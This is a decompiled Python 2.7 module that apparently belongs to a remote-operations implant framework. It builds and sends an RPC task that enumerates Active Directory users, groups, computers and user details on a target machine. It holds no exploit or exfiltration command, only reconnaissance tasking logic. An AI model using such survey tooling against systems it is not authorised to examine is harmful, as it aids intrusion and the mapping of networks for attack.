# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: Mcl_Cmd_ActiveDirectory_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.activedirectory', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.activedirectory.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.survey.cmd.activedirectory.Params()
    tgtParams.pagesize = lpParams['pagesize']
    if lpParams['user'] != None:
        tgtParams.queryInfo = lpParams['user']
    if lpParams['adsPath'] != None:
        tgtParams.adsPath = lpParams['adsPath']
    if lpParams['type'] == mca.survey.cmd.activedirectory.PARAMS_QUERY_TYPE_USERS and (lpParams['verbose'] or len(tgtParams.queryInfo) > 0):
        tgtParams.queryType = mca.survey.cmd.activedirectory.PARAMS_QUERY_TYPE_USERINFO
    else:
        tgtParams.queryType = lpParams['type']
    taskXml = mcl.tasking.Tasking()
    if tgtParams.queryType == mca.survey.cmd.activedirectory.PARAMS_QUERY_TYPE_MODE:
        taskXml.SetType('MODE')
    elif tgtParams.queryType == mca.survey.cmd.activedirectory.PARAMS_QUERY_TYPE_COMPUTERS:
        taskXml.SetType('COMPUTERS')
    elif tgtParams.queryType == mca.survey.cmd.activedirectory.PARAMS_QUERY_TYPE_GROUPS:
        taskXml.SetType('GROUPS')
    elif tgtParams.queryType == mca.survey.cmd.activedirectory.PARAMS_QUERY_TYPE_USERS:
        taskXml.SetType('USERS')
        if len(tgtParams.queryInfo) > 0:
            taskXml.AddSearchMask(tgtParams.queryInfo)
        else:
            taskXml.AddSearchMask('*')
    elif tgtParams.queryType == mca.survey.cmd.activedirectory.PARAMS_QUERY_TYPE_USERINFO:
        taskXml.SetType('USERINFO')
        if len(tgtParams.queryInfo) > 0:
            taskXml.AddSearchMask(tgtParams.queryInfo)
        else:
            taskXml.AddSearchMask('*')
    else:
        mcl.tasking.OutputError('Invalid query type (%u)' % tgtParams.queryType)
        return False
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    rpc = mca.survey.cmd.activedirectory.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.survey.cmd.activedirectory.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)